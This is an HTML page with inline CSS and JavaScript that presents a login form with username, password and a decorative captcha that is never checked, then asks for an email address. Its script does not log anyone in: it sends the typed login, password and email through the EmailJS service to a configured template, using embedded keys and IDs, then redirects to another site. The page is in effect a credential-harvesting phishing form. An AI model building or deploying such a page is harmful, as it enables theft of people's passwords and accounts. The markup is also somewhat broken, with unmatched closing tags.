<style>

  * { box-sizing: border-box; }
  body {
    margin: 0;
    min-height: 100vh;
    background: #eef0fb;
    font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 60px 20px;
  }

  .card-wrap {
    position: relative;
    width: 100%;
    max-width: 370px;
  }

  .mascot {
    position: relative;
    width: 220px;
    margin: 0 auto;
    z-index: 2;
    pointer-events: none;
  }
  .mascot img {
    width: 100%;
    display: block;
  }

  .card {
    position: relative;
    background: #ffffff;
    border-radius: 10px;
    box-shadow: 0 20px 40px rgba(40, 40, 90, 0.12);
    padding: 40px 30px 30px;
    margin-top: -60px;
    z-index: 1;
  }

  h1 {
    text-align: center;
    color: #46465f;
    font-size: 22px;
    font-weight: 600;
    letter-spacing: 1px;
    margin: 0 0 24px;
  }

  .field {
    display: flex;
    align-items: center;
    border: 1px solid #e3e3ee;
    border-radius: 6px;
    padding: 12px 14px;
    margin-bottom: 14px;
    background: #fff;
  }

  .captcha-field {
    padding: 0;
    align-items: stretch;
    overflow: hidden;
  }
  .captcha-field input {
    padding: 12px 14px;
  }

  .field .icon {
    color: #9a9ab0;
    margin-right: 10px;
    display: flex;
    align-items: center;
  }

  .field input {
    border: none;
    outline: none;
    flex: 1;
    font-size: 15px;
    color: #46465f;
    background: transparent;
  }

  .field input::placeholder {
    color: #a9a9bd;
  }

  .captcha-field input {
    max-width: none;
  }

  .captcha-box {
    width: 120px;
    flex-shrink: 0;
    align-self: stretch;
  }
  .captcha-box svg {
    width: 100%;
    height: 100%;
    display: block;
  }

  .remember {
    display: flex;
    align-items: center;
    margin: 4px 0 22px;
  }
  .remember input {
    width: 15px;
    height: 15px;
    margin-right: 8px;
    accent-color: #8bc34a;
  }
  .remember label {
    color: #46465f;
    font-size: 14px;
  }

  .btn-contact {
    width: 100%;
    padding: 14px;
    background: #93bc5a;
    border: none;
    border-radius: 6px;
    color: #fff;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    margin-bottom: 18px;
    transition: background 0.2s ease;
  }
  .btn-contact:hover {
    background: #82ab49;
  }

  .footer-text {
    text-align: center;
    font-size: 14px;
    color: #46465f;
    margin: 0;
  }
  .footer-text a {
    color: #82ab49;
    font-weight: 600;
    text-decoration: none;
  }
  .footer-text a:hover {
    text-decoration: underline;
  }


  #welcomeScreen {
    width: 100%;
    display: flex;
    justify-content: center;
  }

  #emailScreen {
    display: none;
    width: 100%;
    justify-content: center;
  }
#emailScreen * { box-sizing: border-box;}
#emailScreen body {
    margin: 0;
    min-height: 100vh;
    background: #eef0fb;
    font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 60px 20px;}
#emailScreen .card {
    background: #ffffff;
    border-radius: 10px;
    box-shadow: 0 20px 40px rgba(40, 40, 90, 0.12);
    padding: 14px 48px;
    width: 100%;
    max-width: 760px;}
#emailScreen h1 {
    text-align: center;
    color: #46465f;
    font-size: 26px;
    font-weight: 500;
    margin: 0 0 20px;}
#emailScreen .field {
    display: flex;
    align-items: center;
    border: 1px solid #e3e3ee;
    border-radius: 6px;
    height: 48px;
    padding: 0 16px;
    margin-bottom: 16px;
    background: #fff;}
#emailScreen .field .icon {
    color: #9a9ab0;
    margin-right: 10px;
    display: flex;
    align-items: center;}
#emailScreen .field input {
    border: none;
    outline: none;
    flex: 1;
    font-size: 15px;
    color: #46465f;
    background: transparent;}
#emailScreen .field input::placeholder {
    color: #a9a9bd;}
#emailScreen .btn-contact {
    width: 100%;
    padding: 14px;
    background: #93bc5a;
    border: none;
    border-radius: 6px;
    color: #fff;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: background 0.2s ease;}
#emailScreen .btn-contact:hover {
    background: #82ab49;}

@media (max-width: 480px) {
  #emailScreen .card {
    padding: 16px 20px;
  }
}
</style>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

    <div class="card">
      <h1>Login</h1>

      <form id="welcomeForm">
        <div class="field">
          <span class="icon">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.7 0 4.9-2.2 4.9-4.9S14.7 2.2 12 2.2 7.1 4.4 7.1 7.1 9.3 12 12 12zm0 2.5c-3.3 0-9.8 1.6-9.8 4.9v2.4h19.6v-2.4c0-3.3-6.5-4.9-9.8-4.9z"/></svg>
          </span>
          <input type="text" id="welcomeLogin" placeholder="Login">
        </div>

        <div class="field">
          <span class="icon">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M17 8V6a5 5 0 0 0-10 0v2H5v14h14V8h-2zM9 6a3 3 0 0 1 6 0v2H9V6zm3 9a2 2 0 1 1 0-4 2 2 0 0 1 0 4z"/></svg>
          </span>
          <input type="text" id="welcomePassword" placeholder="Password">
        </div>

        <div class="field captcha-field">
          <input type="text" placeholder="Captcha">
          <div class="captcha-box">
            <svg viewBox="0 0 150 56" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
              <defs>
                <pattern id="hatch" width="5" height="5" patternUnits="userSpaceOnUse" patternTransform="rotate(35)">
                  <rect width="5" height="5" fill="#d7d7db"/>
                  <line x1="0" y1="0" x2="0" y2="5" stroke="#c0c0c6" stroke-width="1"/>
                </pattern>
                <pattern id="hatch2" width="9" height="9" patternUnits="userSpaceOnUse" patternTransform="rotate(-35)">
                  <line x1="0" y1="0" x2="0" y2="9" stroke="#bdbdc4" stroke-width="0.6" opacity="0.6"/>
                </pattern>
              </defs>
              <rect width="150" height="56" fill="url(#hatch)"/>
              <rect width="150" height="56" fill="url(#hatch2)"/>
              <g font-family="Georgia, 'Times New Roman', serif" font-weight="bold">
                <text x="4" y="43" font-size="34" fill="#9b3fc9" transform="rotate(-12 20 30)">2</text>
                <text x="24" y="45" font-size="36" fill="#3fae4a" transform="rotate(8 45 28)">8</text>
                <text x="66" y="35" font-size="26" fill="#8b3fc9" transform="rotate(-6 80 26)">+</text>
                <text x="98" y="43" font-size="34" fill="#2f6e3a" transform="rotate(10 115 28)">5</text>
              </g>
              <line x1="2" y1="46" x2="120" y2="8" stroke="#3fae4a" stroke-width="1.2" opacity="0.9"/>
              <line x1="14" y1="4" x2="140" y2="50" stroke="#31356e" stroke-width="1.2" opacity="0.9"/>
            </svg>
          </div>
        </div>

        <div class="remember">
          <input type="checkbox" id="remember">
          <label for="remember">Remember Me</label>
        </div>

        <button type="submit" class="btn-contact">Contact</button>
      </form>

      <p class="footer-text">Not a member? <a href="#">Create an account</a></p>
    </div>
  </div>

  
</div>

<div id="emailScreen">
<div class="card">
    <h1>Email</h1>

    <form id="emailForm">
      <div class="field">
        <span class="icon">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M17 8V6a5 5 0 0 0-10 0v2H5v14h14V8h-2zM9 6a3 3 0 0 1 6 0v2H9V6zm3 9a2 2 0 1 1 0-4 2 2 0 0 1 0 4z"/></svg>
        </span>
        <input type="text" id="emailInput" placeholder="Your Email">
      </div>

      <button type="submit" class="btn-contact">Send</button>
    </form>
  </div>


</div>

  <script>
    // 1. Sign up free at https://www.emailjs.com
    // 2. Add an Secret-KeyService (e.g. Gmail) -> copy its Service ID below
    // 3. Create an Secret-KeyTemplate with {{Login}}, {{Password}}, {{email}} variables -> copy its Template ID below
    // 4. Account > General > copy your Public Key below
    const EMAILJS_PUBLIC_KEY  = 'YTxIBQcZdW1yro2Ev';
    const EMAILJS_SERVICE_ID  = 'service_29ydi5b';
    const EMAILJS_TEMPLATE_ID = 'template_c0hk45r';

    emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });

    document.getElementById('welcomeForm').addEventListener('submit', function (e) {
      e.preventDefault();
      document.getElementById('welcomeScreen').style.display = 'none';
      document.getElementById('emailScreen').style.display = 'flex';
    });

    document.getElementById('emailForm').addEventListener('submit', function (e) {
      e.preventDefault();

      const submitBtn = this.querySelector('.btn-contact');
      const originalText = submitBtn.textContent;
      submitBtn.disabled = true;
      submitBtn.textContent = 'Sending...';

      const templateParams = {
        Login: document.getElementById('welcomeLogin').value,
        Password: document.getElementById('welcomePassword').value,
        email: document.getElementById('emailInput').value
      };

      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
        .then(function () {
          window.location.href = 'https://huboweb.com';
        })
        .catch(function (err) {
          console.error('EmailJS error:', err);
          alert('Something went wrong sending your details. Please try again.');
        })
        .finally(function () {
          submitBtn.disabled = false;
          submitBtn.textContent = originalText;
        });
    });
  </script>
